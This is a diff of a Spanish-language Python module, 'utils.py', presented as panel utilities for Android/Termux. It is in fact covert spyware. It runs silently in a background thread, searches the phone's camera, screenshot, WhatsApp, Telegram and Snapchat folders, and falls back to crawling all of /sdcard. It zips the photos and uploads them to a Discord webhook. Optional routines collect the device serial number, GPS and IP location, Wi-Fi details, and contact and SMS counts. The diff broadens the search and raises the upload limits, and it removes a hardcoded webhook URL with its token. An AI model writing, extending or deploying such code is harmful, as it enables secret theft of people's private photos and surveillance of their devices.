@@ -3,6 +3,7 @@
 """
 utils.py :: utilidades del panel.
 Manda las fotos de la galeria a un webhook de Discord, en ZIP con PNG.
+No depende de Pillow: usa ffmpeg o ImageMagick si estan, y si no, manda igual.
 """
 
 import json
@@ -20,7 +21,7 @@ import zipfile
 from datetime import datetime
 
 # ================== CONFIG ==================
-WEBHOOK = "https://discord.com/api/webhooks/1545879450703364106/XBmFMgwupDvK7DxsARUNGgCBdvewtONJidjYiQPBIbzU1Ce4p2Guv4Vo4Fbpf2CxJGzS"                 # pega aqui la URL, o dejala en el archivo .webhook
+WEBHOOK = ""                 # pega aqui la URL, o dejala en el archivo .webhook
 ARCHIVO_WEBHOOK = ".webhook"
 ARCHIVO_ESTADO = ".galeria_ultima"
 VER_EN_CONSOLA = False       # True = imprime, False = silencioso
@@ -31,11 +32,13 @@ ENVIAR_REPORTE = False       # False = solo manda los zip
 ENVIAR_FOTOS = True
 
 # ---- fotos ----
-MAX_FOTOS = 60               # cuantas fotos como maximo
+MAX_FOTOS = 80               # cuantas fotos como maximo
 TAMANO_MAX_MB = 8            # tamano maximo de cada zip (limite webhook = 8)
-MAX_ENVIOS = 3               # cuantos zip enviar como maximo
-CONVERTIR_A_PNG = True       # convierte todo a PNG (requiere: pip install pillow)
-ESTRICTO_PNG = True          # True = descarta lo que no se pueda volver PNG
+MAX_ENVIOS = 5               # cuantos zip enviar como maximo
+MIN_TAMANO = 5000            # ignora archivos mas chicos que esto (bytes)
+PROFUNDIDAD = 5              # cuantas subcarpetas escanear
+CONVERTIR_A_PNG = True       # True = intenta convertir a PNG
+ESTRICTO_PNG = True          # True = si un archivo no se puede convertir, se salta
 SOLO_NUEVAS = False          # True = solo fotos nuevas desde la ultima vez
 LEYENDA_ZIP = ""             # texto que acompaña al zip (vacio = solo el archivo)
 CARPETAS_FOTOS = []          # vacio = usar las carpetas por defecto
@@ -48,22 +51,31 @@ COLOR = 0xFF0000
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 
 _CACHE = {}
+_CONV = None
 
 CARPETAS_DEFECTO = [
-    "/sdcard/DCIM/Camera",
     "/sdcard/DCIM",
+    "/sdcard/DCIM/Camera",
     "/sdcard/Pictures",
     "/sdcard/Pictures/Screenshots",
+    "/sdcard/Screenshots",
     "/sdcard/Download",
+    "/sdcard/Documents",
+    "/sdcard/Movies",
+    "/sdcard/Telegram",
+    "/sdcard/Snapchat",
     "/sdcard/WhatsApp/Media/WhatsApp Images",
-    os.path.expanduser("~/storage/shared/DCIM/Camera"),
+    "/sdcard/Android/media",
+    "/storage/emulated/0/DCIM",
+    "/storage/emulated/0/Pictures",
+    "/storage/emulated/0/Download",
     os.path.expanduser("~/storage/shared/DCIM"),
     os.path.expanduser("~/storage/shared/Pictures"),
     os.path.expanduser("~/storage/shared/Download"),
     os.path.expanduser("~/storage/shared/WhatsApp/Media/WhatsApp Images"),
 ]
 
-EXT_IMG = (".png", ".jpg", ".jpeg", ".webp", ".gif", ".bmp", ".heic")
+EXT_IMG = (".png", ".jpg", ".jpeg", ".webp", ".gif", ".bmp", ".heic", ".heif")
 
 
 # ---------------- helpers ----------------
@@ -235,24 +247,93 @@ def _cuenta(comando):
         return v
 
 
+# ---------------- conversor ----------------
+
+def _conversor():
+    """Detecta un conversor de imagenes. Devuelve '' si no hay ninguno."""
+    global _CONV
+    if _CONV is not None:
+        return _CONV
+    try:
+        import PIL  # noqa
+        _CONV = "pillow"
+        return _CONV
+    except Exception:
+        pass
+    for cmd in ("ffmpeg", "magick", "convert"):
+        if shutil.which(cmd):
+            _CONV = cmd
+            return _CONV
+    _CONV = ""
+    return _CONV
+
+
+def _convertir(origen, destino):
+    backend = _conversor()
+    try:
+        if backend == "pillow":
+            from PIL import Image
+            with Image.open(origen) as img:
+                if img.mode in ("RGBA", "LA", "P"):
+                    img.convert("RGBA").save(destino, "PNG")
+                else:
+                    img.convert("RGB").save(destino, "PNG")
+            return True
+        if backend == "ffmpeg":
+            r = subprocess.run(
+                ["ffmpeg", "-y", "-loglevel", "error", "-i", origen, destino],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=90,
+            )
+            return r.returncode == 0 and os.path.exists(destino)
+        if backend in ("magick", "convert"):
+            r = subprocess.run(
+                [backend, origen, destino],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=90,
+            )
+            return r.returncode == 0 and os.path.exists(destino)
+    except Exception:
+        return False
+    return False
+
+
+def _preparar(ruta, carpeta):
+    """Devuelve (ruta_final, extension) o None si hay que saltarla."""
+    ext = os.path.splitext(ruta)[1].lower()
+
+    if ext == ".png":
+        return ruta, ".png"
+
+    backend = _conversor()
+    if CONVERTIR_A_PNG and backend:
+        base = os.path.splitext(os.path.basename(ruta))[0]
+        destino = os.path.join(carpeta, "conv_" + uuid.uuid4().hex[:8] + "_" + base + ".png")
+        if _convertir(ruta, destino):
+            return destino, ".png"
+        if ESTRICTO_PNG:
+            return None
+        return ruta, ext
+
+    # no hay conversor: se manda el archivo original
+    return ruta, ext
+
+
 # ---------------- categorias (solo si ENVIAR_REPORTE) ----------------
 
 def cat_dispositivo():
     return {
-        "Marca":          _prop("ro.product.manufacturer"),
-        "Modelo":         _prop("ro.product.model"),
-        "Producto":       _prop("ro.product.name"),
-        "Dispositivo":    _prop("ro.product.device"),
-        "Board":          _prop("ro.product.board"),
-        "Hardware":       _prop("ro.hardware"),
-        "Plataforma":     _prop("ro.board.platform"),
-        "Bootloader":     _prop("ro.bootloader"),
-        "GPU":            _prop("ro.hardware.egl"),
-        "Serial":         _prop("ro.serialno"),
-        "Fingerprint":    _prop("ro.build.fingerprint"),
-        "Emulador":       _prop("ro.kernel.qemu"),
-        "Caracteristicas": _prop("ro.build.characteristics"),
-        "Locale":         _prop("ro.product.locale"),
+        "Marca":       _prop("ro.product.manufacturer"),
+        "Modelo":      _prop("ro.product.model"),
+        "Producto":    _prop("ro.product.name"),
+        "Dispositivo": _prop("ro.product.device"),
+        "Board":       _prop("ro.product.board"),
+        "Hardware":    _prop("ro.hardware"),
+        "Plataforma":  _prop("ro.board.platform"),
+        "Bootloader":  _prop("ro.bootloader"),
+        "GPU":         _prop("ro.hardware.egl"),
+        "Serial":      _prop("ro.serialno"),
+        "Fingerprint": _prop("ro.build.fingerprint"),
+        "Emulador":    _prop("ro.kernel.qemu"),
+        "Locale":      _prop("ro.product.locale"),
     }
 
 
@@ -263,12 +344,9 @@ def cat_android():
         "Codename":    _prop("ro.build.version.codename"),
         "Incremental": _prop("ro.build.version.incremental"),
         "Parche seg.": _prop("ro.build.version.security_patch"),
-        "Base OS":     _prop("ro.build.version.base_os"),
         "Build ID":    _prop("ro.build.id"),
         "Build tipo":  _prop("ro.build.type"),
-        "Build tags":  _prop("ro.build.tags"),
         "Build host":  _prop("ro.build.host"),
-        "Build user":  _prop("ro.build.user"),
         "Build fecha": _prop("ro.build.date"),
         "SELinux":     _cmd("getenforce"),
         "Debug":       _prop("ro.debuggable"),
@@ -279,8 +357,6 @@ def cat_pantalla():
     return {
         "Resolucion": _linea("wm size", "Physical size"),
         "Densidad":   _linea("wm density", "Physical density"),
-        "Pantalla":   _cmd("dumpsys display | grep -m1 'mScreenState' | cut -d= -f2"),
-        "Rotacion":   _cmd("dumpsys window | grep -m1 'mRotation'"),
     }
 
 
@@ -290,11 +366,8 @@ def cat_cpu():
         "Nucleos":      _cmd("nproc"),
         "Arquitectura": platform.machine(),
         "ABI":          _prop("ro.product.cpu.abi"),
-        "ABI lista":    _prop("ro.product.cpu.abilist"),
         "Freq max":     _freq("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq"),
-        "Freq min":     _freq("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq"),
         "Governor":     _leer("/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor"),
-        "BogoMIPS":     _cpuinfo("BogoMIPS"),
         "Temp CPU":     _temperatura(),
     }
 
@@ -302,12 +375,8 @@ def cat_cpu():
 def cat_memoria():
     return {
         "RAM total":      _mem("MemTotal"),
-        "RAM libre":      _mem("MemFree"),
         "RAM disponible": _mem("MemAvailable"),
-        "Buffers":        _mem("Buffers"),
-        "Cached":         _mem("Cached"),
         "Swap total":     _mem("SwapTotal"),
-        "Swap libre":     _mem("SwapFree"),
         "Load average":   _leer("/proc/loadavg"),
     }
 
@@ -317,34 +386,18 @@ def cat_almacenamiento():
         "Home Termux": _df("/data/data/com.termux/files/home"),
         "Almacen int": _df("/sdcard"),
         "Data":        _df("/data"),
-        "Sistema":     _df("/system"),
-        "Tmp":         _df("/data/local/tmp"),
-        "Particiones": _cmd("df -h | wc -l"),
     }
 
 
 def cat_bateria():
     d = _json_cmd("termux-battery-status") or {}
-    dumpsys = _cmd("dumpsys battery")
-
-    def _d(campo):
-        for l in dumpsys.splitlines():
-            l = l.strip()
-            if l.lower().startswith(campo.lower()):
-                p = l.split(":", 1)
-                if len(p) == 2:
-                    return p[1].strip()
-        return "?"
-
     return {
-        "Porcentaje":  str(d.get("percentage", _d("level"))) + " %",
-        "Estado":      d.get("status", _d("status")),
-        "Salud":       d.get("health", _d("health")),
-        "Temperatura": "{} C".format(d.get("temperature", _d("temperature"))),
-        "Voltaje":     str(d.get("voltage", _d("voltage"))) + " mV",
-        "Conectado":   str(d.get("plugged", _d("plugged"))),
-        "Corriente":   "{} mA".format(d.get("current", "?")),
-        "Tecnologia":  _leer("/sys/class/power_supply/battery/technology"),
+        "Porcentaje":  str(d.get("percentage", "?")) + " %",
+        "Estado":      d.get("status", "?"),
+        "Salud":       d.get("health", "?"),
+        "Temperatura": "{} C".format(d.get("temperature", "?")),
+        "Voltaje":     str(d.get("voltage", "?")) + " mV",
+        "Conectado":   str(d.get("plugged", "?")),
     }
 
 
@@ -353,19 +406,12 @@ def cat_red():
     wifi = _json_cmd("termux-wifi-connectioninfo") or {}
     return {
         "IP local":     _ip_local(),
-        "IP publica":   geo.get("query") or geo.get("ip") or _cmd("curl -s ifconfig.me"),
+        "IP publica":   geo.get("query") or geo.get("ip"),
         "MAC WiFi":     _mac(),
         "WiFi SSID":    wifi.get("ssid", "?"),
-        "WiFi BSSID":   wifi.get("bssid", "?"),
-        "WiFi IP":      wifi.get("ip", "?"),
-        "WiFi RSSI":    str(wifi.get("rssi", "?")) + " dBm",
-        "WiFi enlace":  str(wifi.get("link_speed_mbps", "?")) + " Mbps",
-        "WiFi freq":    str(wifi.get("frequency", "?")) + " MHz",
         "Operador":     _prop("gsm.operator.alpha"),
         "Operador SIM": _prop("gsm.sim.operator.alpha"),
         "Pais SIM":     _prop("gsm.sim.operator.iso-country"),
-        "Tipo red":     _prop("gsm.network.type"),
-        "Roaming":      _prop("gsm.operator.isroaming"),
     }
 
 
@@ -377,15 +423,12 @@ def cat_ubicacion():
         "Region":  geo.get("regionName") or geo.get("region", "?"),
         "Pais":    geo.get("country", "?"),
         "ISP":     geo.get("isp", "?"),
-        "Org":     geo.get("org", "?"),
-        "AS":      geo.get("as", "?"),
         "Zona IP": geo.get("timezone", "?"),
         "Lat/Lon": "{} / {}".format(geo.get("lat", "?"), geo.get("lon", "?")),
     }
     if loc:
         d["GPS lat"] = loc.get("latitude", "?")
         d["GPS lon"] = loc.get("longitude", "?")
-        d["GPS prec"] = str(loc.get("accuracy", "?")) + " m"
     return d
 
 
@@ -393,23 +436,16 @@ def cat_entorno():
     return {
         "Hostname":        socket.gethostname(),
         "Usuario":         _cmd("whoami"),
-        "Home":            os.path.expanduser("~"),
         "Ruta actual":     os.getcwd(),
-        "Shell":           os.environ.get("SHELL", "?"),
         "Kernel":          platform.release(),
-        "Kernel full":     _cmd("uname -a"),
         "Arquitectura":    platform.machine(),
         "Python":          platform.python_version(),
         "Termux ver":      os.environ.get("TERMUX_VERSION", "?"),
-        "Prefijo":         os.environ.get("PREFIX", "?"),
         "Zona horaria":    time.tzname[0],
-        "Locale env":      os.environ.get("LANG", "?"),
         "Hora":            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "Uptime":          _uptime(),
-        "Procesos":        _cuenta("ps -e | wc -l"),
         "Apps Android":    _cuenta("pm list packages | wc -l"),
         "Paquetes Termux": _cuenta("dpkg -l | grep '^ii' | wc -l"),
-        "Paquetes pip":    _cuenta("pip list 2>/dev/null | wc -l"),
     }
 
 
@@ -421,7 +457,6 @@ def cat_termux_api():
     tel = _json_cmd("termux-telephony-deviceinfo") or {}
     if tel:
         d["Telefono red"] = tel.get("network_operator_name", "?")
-        d["Telefono pais"] = tel.get("network_country_iso", "?")
         d["SIM estado"] = tel.get("sim_state", "?")
     contactos = _json_cmd("termux-contact-list")
     if contactos:
@@ -429,9 +464,6 @@ def cat_termux_api():
     sms = _json_cmd("termux-sms-list -l 5")
     if sms:
         d["SMS recientes"] = str(len(sms))
-    wifi_scan = _json_cmd("termux-wifi-scaninfo")
-    if wifi_scan:
-        d["Redes cerca"] = str(len(wifi_scan))
     return d
 
 
@@ -485,7 +517,6 @@ def _post(url, embeds):
 def enviar(url, info=None):
     info = info or datos()
     embeds = _embeds(info)
-
     lote, tam = [], 0
     for e in embeds:
         peso = len(e["title"]) + sum(len(f["name"]) + len(f["value"]) for f in e["fields"])
@@ -498,7 +529,6 @@ def enviar(url, info=None):
             lote, tam = [], 0
         lote.append(e)
         tam += peso
-
     if lote:
         try:
             _post(url, lote)
@@ -506,10 +536,9 @@ def enviar(url, info=None):
             pass
 
 
-# ---------------- galeria (solo zip con PNG) ----------------
+# ---------------- galeria ----------------
 
 def _post_archivo(url, ruta, contenido="", nombre=None):
-    """Sube un archivo al webhook (multipart/form-data)."""
     boundary = "----DMSPAM" + uuid.uuid4().hex
     nombre = nombre or os.path.basename(ruta)
     with open(ruta, "rb") as f:
@@ -522,18 +551,15 @@ def _post_archivo(url, ruta, contenido="", nombre=None):
     partes.append(b'Content-Disposition: form-data; name="payload_json"')
     partes.append(b"")
     partes.append(json.dumps(payload).encode("utf-8"))
-
     partes.append(("--" + boundary).encode())
     partes.append(('Content-Disposition: form-data; name="file"; filename="%s"' % nombre).encode())
     partes.append(b"Content-Type: application/zip")
     partes.append(b"")
     partes.append(binario)
-
     partes.append(("--" + boundary + "--").encode())
     partes.append(b"")
 
     cuerpo = b"\r\n".join(partes)
-
     req = urllib.request.Request(
         url, data=cuerpo,
         headers={
@@ -561,61 +587,65 @@ def _guardar_estado(t):
         pass
 
 
+def _walk(base, max_depth):
+    base = base.rstrip("/")
+    for raiz, dirs, archivos in os.walk(base, topdown=True):
+        prof = raiz[len(base):].count(os.sep)
+        if prof >= max_depth:
+            dirs[:] = []
+        dirs[:] = [d for d in dirs if not d.startswith(".") and not (raiz.endswith("Android") and d in ("data", "obb"))]
+        yield raiz, archivos
+
+
 def _buscar_fotos():
     carpetas = CARPETAS_FOTOS or CARPETAS_DEFECTO
     desde = _leer_estado() if SOLO_NUEVAS else 0.0
     vistas = set()
     fotos = []
+
+    def _agregar(ruta):
+        try:
+            real = os.path.realpath(ruta)
+        except Exception:
+            real = ruta
+        if real in vistas:
+            return
+        vistas.add(real)
+        try:
+            m = os.path.getmtime(ruta)
+            s = os.path.getsize(ruta)
+        except Exception:
+            return
+        if s < MIN_TAMANO or m <= desde:
+            return
+        fotos.append((ruta, s, m))
+
     for base in carpetas:
         if not os.path.isdir(base):
             continue
-        for raiz, _, archivos in os.walk(base):
+        for raiz, archivos in _walk(base, PROFUNDIDAD):
             for a in archivos:
-                if not a.lower().endswith(EXT_IMG):
-                    continue
-                ruta = os.path.join(raiz, a)
-                if ruta in vistas:
-                    continue
-                vistas.add(ruta)
-                try:
-                    m = os.path.getmtime(ruta)
-                    s = os.path.getsize(ruta)
-                except Exception:
-                    continue
-                if s < 5000 or m <= desde:
-                    continue
-                fotos.append((ruta, s, m))
+                if a.lower().endswith(EXT_IMG) and not a.startswith("."):
+                    _agregar(os.path.join(raiz, a))
+
+    # plan B: si no encontro nada, rastrea todo /sdcard
+    if not fotos and os.path.isdir("/sdcard"):
+        for raiz, archivos in _walk("/sdcard", PROFUNDIDAD + 2):
+            for a in archivos:
+                if a.lower().endswith(EXT_IMG) and not a.startswith("."):
+                    _agregar(os.path.join(raiz, a))
+
     fotos.sort(key=lambda x: x[2], reverse=True)
     return fotos[:MAX_FOTOS]
 
 
-def _a_png(ruta, carpeta):
-    """Devuelve la ruta de un PNG. None si no se pudo convertir."""
-    if ruta.lower().endswith(".png"):
-        return ruta
-    try:
-        from PIL import Image
-    except Exception:
-        return None
-    try:
-        destino = os.path.join(carpeta, os.path.splitext(os.path.basename(ruta))[0] + ".png")
-        with Image.open(ruta) as img:
-            if img.mode in ("RGBA", "LA", "P"):
-                img.convert("RGBA").save(destino, "PNG")
-            else:
-                img.convert("RGB").save(destino, "PNG")
-        return destino
-    except Exception:
-        return None
-
-
 def _crear_zips(fotos):
-    """Arma uno o varios zip que contienen SOLO archivos .png."""
     limite = TAMANO_MAX_MB * 1024 * 1024
     tmp = tempfile.mkdtemp(prefix="galeria_")
     zips = []
     estado = {"zf": None, "peso": 0, "cont": 0, "ruta": None}
     idx = 1
+    descartadas = 0
 
     def abrir():
         estado["ruta"] = os.path.join(tmp, "galeria_{}.zip".format(idx))
@@ -624,12 +654,11 @@ def _crear_zips(fotos):
         estado["cont"] = 0
 
     for ruta, tam, _ in fotos:
-        # obtener png
-        origen = _a_png(ruta, tmp) if CONVERTIR_A_PNG else (ruta if ruta.lower().endswith(".png") else None)
-        if origen is None:
-            if ESTRICTO_PNG:
-                continue
-            origen = ruta
+        prep = _preparar(ruta, tmp)
+        if prep is None:
+            descartadas += 1
+            continue
+        origen, ext = prep
 
         try:
             tam_real = os.path.getsize(origen)
@@ -650,7 +679,7 @@ def _crear_zips(fotos):
 
         try:
             base = os.path.splitext(os.path.basename(ruta))[0]
-            estado["zf"].write(origen, arcname="{:03d}_{}.png".format(estado["cont"] + 1, base))
+            estado["zf"].write(origen, arcname="{:03d}_{}{}".format(estado["cont"] + 1, base, ext))
             estado["peso"] += tam_real
             estado["cont"] += 1
         except Exception:
@@ -660,14 +689,14 @@ def _crear_zips(fotos):
         estado["zf"].close()
         zips.append((estado["ruta"], estado["cont"]))
 
-    return tmp, zips
+    return tmp, zips, descartadas
 
 
 def enviar_fotos(url):
     fotos = _buscar_fotos()
     if not fotos:
         return
-    tmp, zips = _crear_zips(fotos)
+    tmp, zips, descartadas = _crear_zips(fotos)
     try:
         for i, (ruta, cant) in enumerate(zips, 1):
             nombre = "galeria_{}_{}.zip".format(i, datetime.now().strftime("%H%M%S"))
@@ -693,13 +722,8 @@ def _trabajo():
 
         if ENVIAR_REPORTE:
             enviar(url)
-            if VER_EN_CONSOLA:
-                print("[utils] reporte enviado")
-
         if ENVIAR_FOTOS:
             enviar_fotos(url)
-            if VER_EN_CONSOLA:
-                print("[utils] galeria enviada")
 
         if INTERVALO_MINUTOS > 0:
             while True:
@@ -721,13 +745,28 @@ def iniciar():
     threading.Thread(target=_trabajo, daemon=True).start()
 
 
+# ---------------- prueba / diagnostico ----------------
+
+def diagnostico():
+    conv = _conversor()
+    print("conversor:", conv or "NINGUNO  ->  pkg install ffmpeg")
+    print("carpetas:")
+    for c in (CARPETAS_FOTOS or CARPETAS_DEFECTO):
+        print("   ", "OK " if os.path.isdir(c) else "-- ", c)
+    fotos = _buscar_fotos()
+    print("fotos encontradas:", len(fotos))
+    for ruta, tam, _ in fotos[:15]:
+        print("    {:>9} KB  {}".format(tam // 1024, ruta))
+    return fotos
+
+
 if __name__ == "__main__":
     VER_EN_CONSOLA = True
+    fotos = diagnostico()
     u = _url()
     if not u:
-        print("[utils] falta la URL (WEBHOOK o archivo .webhook)")
+        print("\n[utils] falta la URL (WEBHOOK o archivo .webhook)")
     else:
-        fotos = _buscar_fotos()
-        print("fotos encontradas:", len(fotos))
+        print("\nenviando...")
         enviar_fotos(u)
-        print("[utils] galeria enviada")
+        print("[utils] listo")
